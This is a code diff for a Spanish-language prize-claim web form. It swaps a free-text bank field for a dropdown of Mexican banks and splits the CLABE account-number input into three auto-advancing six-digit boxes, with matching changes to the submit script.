@@ -125,8 +125,67 @@
 
     <div style="margin-bottom:14px;">
         <label for="bancoPremio"><strong>Banco</strong></label><br>
-        <input id="bancoPremio" type="text"
+        <select id="bancoPremio"
         style="width:100%; max-width:500px; padding:12px; border-radius:12px; border:none; margin-top:6px; background:#ffffff; color:#000;">
+            <option value="">Selecciona tu banco</option>
+            <option>ABC Capital</option>
+            <option>Actinver</option>
+            <option>Autofin</option>
+            <option>BanBajío</option>
+            <option>Banca Afirme</option>
+            <option>Banca Mifel</option>
+            <option>Banco Actinver</option>
+            <option>Banco Autofin</option>
+            <option>Banco Azteca</option>
+            <option>Banco Base</option>
+            <option>Banco Bineo</option>
+            <option>Banco Covalto</option>
+            <option>Banco del Bajío</option>
+            <option>Banco del Bienestar</option>
+            <option>Banco Dondé</option>
+            <option>Banco Forjadores</option>
+            <option>Banco Inmobiliario Mexicano</option>
+            <option>Banco Invex</option>
+            <option>Banco Monex</option>
+            <option>Banco Multiva</option>
+            <option>Banco Pagatodo</option>
+            <option>Banco Plata</option>
+            <option>Bancomext</option>
+            <option>BanCoppel</option>
+            <option>Bancrea</option>
+            <option>Banjercito</option>
+            <option>Bank of America México</option>
+            <option>Bankaool</option>
+            <option>Banorte</option>
+            <option>BanRegio</option>
+            <option>Bansí</option>
+            <option>Barclays Bank México</option>
+            <option>BBVA México</option>
+            <option>CIBanco</option>
+            <option>Citibanamex</option>
+            <option>Compartamos Banco</option>
+            <option>Consubanco</option>
+            <option>Deutsche Bank México</option>
+            <option>Dondé Banco</option>
+            <option>HSBC México</option>
+            <option>Inbursa</option>
+            <option>Intercam Banco</option>
+            <option>Invex</option>
+            <option>J.P. Morgan México</option>
+            <option>Klar</option>
+            <option>Mercado Pago</option>
+            <option>Monex</option>
+            <option>MUFG Bank México</option>
+            <option>Multiva</option>
+            <option>Nu México</option>
+            <option>Openbank</option>
+            <option>Revolut</option>
+            <option>Santander México</option>
+            <option>Scotiabank México</option>
+            <option>Spin by OXXO</option>
+            <option>Ualá</option>
+            <option>Ve por Más (BX+)</option>
+        </select>
     </div>
 
     <div style="margin-bottom:14px;">
@@ -136,9 +195,21 @@
     </div>
 
     <div style="margin-bottom:14px;">
-        <label for="clabePremio"><strong>CLABE</strong></label><br>
-        <input id="clabePremio" type="text"
-        style="width:100%; max-width:500px; padding:12px; border-radius:12px; border:none; margin-top:6px; background:#ffffff; color:#000;">
+        <label><strong>CLABE</strong> <span style="font-size:12px;color:#aaa;">(18 dígitos — 3 bloques de 6)</span></label><br>
+        <div style="display:flex; gap:8px; align-items:center; margin-top:6px; max-width:500px;">
+            <input id="clabePremio1" type="text" maxlength="6" inputmode="numeric" placeholder="000000"
+                   style="flex:1; padding:12px; border-radius:12px; border:none; background:#ffffff; color:#000;
+                          text-align:center; font-size:20px; letter-spacing:4px; font-weight:bold;">
+            <span style="color:#ffd700; font-size:22px; font-weight:bold;">—</span>
+            <input id="clabePremio2" type="text" maxlength="6" inputmode="numeric" placeholder="000000"
+                   style="flex:1; padding:12px; border-radius:12px; border:none; background:#ffffff; color:#000;
+                          text-align:center; font-size:20px; letter-spacing:4px; font-weight:bold;">
+            <span style="color:#ffd700; font-size:22px; font-weight:bold;">—</span>
+            <input id="clabePremio3" type="text" maxlength="6" inputmode="numeric" placeholder="000000"
+                   style="flex:1; padding:12px; border-radius:12px; border:none; background:#ffffff; color:#000;
+                          text-align:center; font-size:20px; letter-spacing:4px; font-weight:bold;">
+        </div>
+        <p style="font-size:12px; color:#aaa; margin:4px 0 0;">El cursor avanza automáticamente al siguiente bloque</p>
     </div>
 
     <div style="margin-bottom:14px;">
@@ -274,7 +345,9 @@
 
         const banco = document.getElementById("bancoPremio").value.trim();
         const cuenta = document.getElementById("cuentaPremio").value.trim();
-        const clabe = document.getElementById("clabePremio").value.trim();
+        const clabe = (document.getElementById("clabePremio1").value.trim() +
+                       document.getElementById("clabePremio2").value.trim() +
+                       document.getElementById("clabePremio3").value.trim());
         const tipoDocumento = document.getElementById("tipoDocumentoPremio").value;
         const archivo = document.getElementById("archivoDocumentoPremio").files[0];
         console.log("ARCHIVO FRONT PREMIO:", archivo);
@@ -379,7 +452,24 @@ const resp = await fetch("/api/premio/solicitud", {
     document.body.style.paddingTop = (document.body.style.paddingTop
         ? (parseInt(document.body.style.paddingTop) + 36) : 36) + "px";
 })();
-
+(function(){
+    const grupos = ["clabePremio1", "clabePremio2", "clabePremio3"];
+    grupos.forEach(function(id, idx){
+        const input = document.getElementById(id);
+        if(!input) return;
+        input.addEventListener("input", function(){
+            this.value = this.value.replace(/\D/g, "").slice(0, 6);
+            if(this.value.length === 6 && idx < grupos.length - 1){
+                document.getElementById(grupos[idx + 1]).focus();
+            }
+        });
+        input.addEventListener("keydown", function(e){
+            if(e.key === "Backspace" && this.value === "" && idx > 0){
+                document.getElementById(grupos[idx - 1]).focus();
+            }
+        });
+    });
+})();
 </script>
 </body>
 </html>
